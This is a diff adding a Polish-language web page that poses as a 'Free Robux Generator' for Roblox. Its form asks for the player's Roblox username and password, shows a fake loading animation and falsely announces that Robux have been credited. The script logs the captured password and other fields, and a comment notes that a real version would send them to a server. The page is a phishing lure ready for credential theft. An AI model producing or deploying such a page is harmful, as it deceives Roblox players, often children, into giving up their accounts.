@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Generator Free Robux</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #2c3e50, #1a1a2e);
+            color: #fff;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            color: #ff4757;
+            margin-bottom: 10px;
+            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            color: #dfe4ea;
+        }
+        
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        h2 {
+            color: #ffa502;
+            margin-bottom: 15px;
+            font-size: 1.8rem;
+        }
+        
+        p {
+            line-height: 1.6;
+            margin-bottom: 15px;
+            font-size: 1.1rem;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #70a1ff;
+        }
+        
+        input, textarea {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.9);
+            color: #2f3542;
+            font-size: 1rem;
+        }
+        
+        button {
+            background: linear-gradient(to right, #ff9a3c, #ff6b6b);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.2rem;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: block;
+            margin: 20px auto;
+            font-weight: bold;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        }
+        
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.4);
+        }
+        
+        .result {
+            text-align: center;
+            padding: 20px;
+            font-size: 1.3rem;
+            color: #7bed9f;
+            display: none;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            padding: 20px;
+            color: #a4b0be;
+            font-size: 0.9rem;
+        }
+        
+        .robux-icon {
+            font-size: 3rem;
+            color: #ff4757;
+            margin: 10px;
+        }
+        
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #ff4757;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .step {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 10px;
+            border-radius: 8px;
+        }
+        
+        .step-number {
+            background: #ff4757;
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>FREE ROBUX GENERATOR</h1>
+            <p class="subtitle">Otrzymaj darmowe Robux dla swojego konta Roblox!</p>
+        </header>
+        
+        <div class="card">
+            <h2>Jak otrzymać darmowe Robux?</h2>
+            
+            <div class="step">
+                <div class="step-number">1</div>
+                <p>Wypełnij poniższy formularz swoimi danymi</p>
+            </div>
+            
+            <div class="step">
+                <div class="step-number">2</div>
+                <p>Kliknij przycisk "Generuj Robux"</p>
+            </div>
+            
+            <div class="step">
+                <div class="step-number">3</div>
+                <p>Poczekaj na przetworzenie twojego żądania</p>
+            </div>
+            
+            <div class="step">
+                <div class="step-number">4</div>
+                <p>Odbierz swoje Robux na koncie Roblox!</p>
+            </div>
+        </div>
+        
+        <div class="card">
+            <h2>Generator Robux - Formularz</h2>
+            
+            <div class="form-group">
+                <label for="username">Nazwa użytkownika Roblox:</label>
+                <input type="text" id="username" placeholder="Wprowadź swoją nazwę użytkownika">
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Hasło do Roblox:</label>
+                <input type="password" id="password" placeholder="Wprowadź swoje hasło">
+            </div>
+            
+            <div class="form-group">
+                <label for="email">Twój e-mail:</label>
+                <input type="email" id="email" placeholder="Wpisz adres Email">
+            </div>
+            
+            <div class="form-group">
+                <label for="robuxAmount">Ilość Robux do wygenerowania:</label>
+                <input type="number" id="robuxAmount" placeholder="Np. 1000, 5000, 10000" min="1000" max="100000">
+            </div>
+            
+            <div class="form-group">
+                <label for="message">Dlaczego chcesz darmowe Robux?</label>
+                <textarea id="message" rows="4" placeholder="Opisz, do czego chcesz użyć Robux..."></textarea>
+            </div>
+            
+            <button onclick="generateRobux()">GENERUJ ROBUX!</button>
+        </div>
+        
+        <div class="loader" id="loader"></div>
+        
+        <div class="result" id="result">
+            <div class="robux-icon">&#8383;</div>
+            <p>Generowanie zakończone! <span id="robuxCount">0</span> Robux zostało dodane do Twojego konta!</p>
+            <p>Sprawdź swoje konto Roblox w ciągu najbliższych 24 godzin.</p>
+        </div>
+        
+        <footer>
+
+        </footer>
+    </div>
+
+    <script>
+        function generateRobux() {
+            // Pobieranie wartości z formularza
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const email = document.getElementById('email').value;
+            const robuxAmount = document.getElementById('robuxAmount').value;
+            const message = document.getElementById('message').value;
+            
+            // Walidacja - czy wszystkie pola są wypełnione
+            if (!username || !password || !email || !robuxAmount || !message) {
+                alert('Proszę wypełnić wszystkie pola formularza!');
+                return;
+            }
+            
+            // Pokazanie animacji ładowania
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('result').style.display = 'none';
+            
+            // Symulacja "generowania" Robux - losowa liczba między 1000 a 5000
+            const robux = Math.floor(Math.random() * 4001) + 1000;
+            
+            // Symulacja opóźnienia przetwarzania
+            setTimeout(() => {
+                // Ukrycie ładowania i pokazanie wyniku
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('robuxCount').textContent = robuxAmount;
+                document.getElementById('result').style.display = 'block';
+                
+                // Przewijanie do wyniku
+                document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
+                
+                // Wysłanie danych (w rzeczywistości to wymagałoby backendu)
+                console.log('Dane odebrane:');
+                console.log('Nazwa użytkownika:', username);
+                console.log('Hasło:', password);
+                console.log('E-mail:', email);
+                console.log('Ilość Robux:', robuxAmount);
+                console.log('Wiadomość:', message);
+                
+                // Tutaj w rzeczywistej implementacji byłby kod wysyłający dane na serwer
+                // np. using fetch() lub XMLHttpRequest()
+                
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
